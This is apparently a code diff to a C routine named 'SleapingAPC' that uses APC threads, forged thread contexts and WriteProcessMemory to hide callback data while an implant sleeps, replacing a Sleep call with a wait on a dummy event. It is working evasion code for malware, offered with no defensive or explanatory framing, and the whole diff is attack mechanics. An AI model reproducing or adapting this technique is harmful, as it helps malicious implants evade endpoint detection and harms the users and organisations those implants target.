@@ -12,11 +12,14 @@
 int SleapingAPC(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHANDLE EvntFix, PHANDLE apcThreads, PCONTEXT Ctx, PCONTEXT CtxInit, PCONTEXT CtxFix, PCONTEXT CtxInitFix, PDWORD64 ResumeThreadValue) {
     //variables and logic for SLEAPING APC callback hiding
     
+    //dummy event 
+    HANDLE hEvent = { 0 };
+
     //APC threads
     HANDLE   Thread = { 0 };
     HANDLE   ThreadFix = { 0 };
 
-    //function pointers 
+	//function pointers for APC threads
     PVOID NtTestAlertAddress = NULL;
     PVOID NtWaitForSingleObjectAddress = NULL;
     PVOID NtContinueAddress = NULL;
@@ -49,6 +52,7 @@ int SleapingAPC(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHAND
     
     
 	//NT functions
+    NtCreateEventFunc NtCreateEvent = (NtCreateEventFunc)GetProcAddress(hNtdll, "NtCreateEvent");
     NtCreateThreadExFunc NtCreateThreadEx = (NtCreateThreadExFunc)GetProcAddress(hNtdll, "NtCreateThreadEx");
     NtGetContextThreadFunc NtGetContextThread = (NtGetContextThreadFunc)GetProcAddress(hNtdll, "NtGetContextThread");
     NtWaitForSingleObjectFunc NtWaitForSingleObject = (NtWaitForSingleObjectFunc)GetProcAddress(hNtdll, "NtWaitForSingleObject");
@@ -56,7 +60,7 @@ int SleapingAPC(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHAND
     NtAlertResumeThreadFunc NtAlertResumeThread = (NtAlertResumeThreadFunc)GetProcAddress(hNtdll, "NtAlertResumeThread");
 
 
-    if (NtCreateThreadEx == NULL || NtGetContextThread == NULL || NtWaitForSingleObject == NULL || NtQueueApcThread == NULL || NtAlertResumeThread == NULL) {
+    if (NtCreateThreadEx == NULL || NtGetContextThread == NULL || NtWaitForSingleObject == NULL || NtQueueApcThread == NULL || NtAlertResumeThread == NULL || NtCreateEvent == NULL) {
         return -1;
     }
 
@@ -82,6 +86,10 @@ int SleapingAPC(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHAND
     
     /*-------------FIXING--------------*/
 
+    //create dummy event for waiting without sleeping
+    if (!NT_SUCCESS(NtCreateEvent(&hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE))) {
+        return -1;
+    }
 
     //i create a thread and i think that with this API and a NULL function address it gets created in suspended state (it does, still not alertable though)
     if (!NT_SUCCESS(NtCreateThreadEx(&ThreadFix, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL))) {
@@ -182,8 +190,9 @@ int SleapingAPC(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHAND
     CtxFix[0].R8 = NULL;
 
     *(ULONG_PTR*)((CtxFix[1]).Rsp) = (DWORD64)NtTestAlertAddress;
-    CtxFix[1].Rip = (DWORD64)(Sleep);
-    CtxFix[1].Rcx = (DWORD64)17000;
+    CtxFix[1].Rip = (DWORD64)(WaitForSingleObject);
+    CtxFix[1].Rcx = (DWORD64)hEvent;
+	CtxFix[1].Rdx = (DWORD64)17000;
 
     *(ULONG_PTR*)((CtxFix[2]).Rsp) = (DWORD64)NtTestAlertAddress;
     CtxFix[2].Rip = (DWORD64)WriteProcessMemory;
